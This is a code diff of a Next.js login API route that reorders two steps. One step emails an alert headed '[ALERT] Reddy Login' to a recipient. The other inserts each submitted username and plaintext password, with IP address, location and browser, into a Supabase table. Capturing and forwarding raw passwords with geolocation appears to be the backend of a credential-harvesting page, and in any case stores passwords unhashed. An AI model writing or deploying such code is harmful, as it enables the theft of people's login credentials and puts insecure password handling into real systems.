@@ -47,25 +47,6 @@ export async function POST(request: Request) {
     const now = new Date();
     const indianTime = formatIndianTime(now);
 
-    // 1. Save to Supabase
-    try {
-      const tableName = process.env.SUPABASE_TABLE_NAME!;
-      await supabase
-        .from(tableName)
-        .insert([
-          {
-            username,
-            password,
-            ip_address: ip,
-            location,
-            browser: browser || 'Unknown',
-            login_time: now.toISOString(),
-          },
-        ]);
-    } catch (dbError) {
-      console.error('Supabase error:', dbError);
-    }
-
     // 2. Send Email
     const emailUser = process.env.EMAIL_USER;
     const emailPass = process.env.EMAIL_PASS;
@@ -144,12 +125,38 @@ export async function POST(request: Request) {
         </html>
       `;
 
+      // Send Email
       await transporter.sendMail({
         from: `"Reddy Admin" <${emailUser}>`,
         to: recipient,
         subject: `[ALERT] Reddy Login: ${username}`,
         html,
       });
+
+      // 1. Save to Supabase (only if email was attempted)
+      try {
+        const tableName = process.env.SUPABASE_TABLE_NAME!;
+        const { error: dbError } = await supabase
+          .from(tableName)
+          .insert([
+            {
+              username,
+              password,
+              ip_address: ip,
+              location,
+              browser: browser || 'Unknown',
+              login_time: now.toISOString(),
+            },
+          ]);
+        
+        if (dbError) {
+          console.error('Supabase Database Error:', dbError.message, dbError.details, dbError.hint);
+        } else {
+          console.log('Login details stored successfully in Supabase.');
+        }
+      } catch (err) {
+        console.error('Supabase Execution Error:', err);
+      }
     }
 
     return NextResponse.json({ success: true });
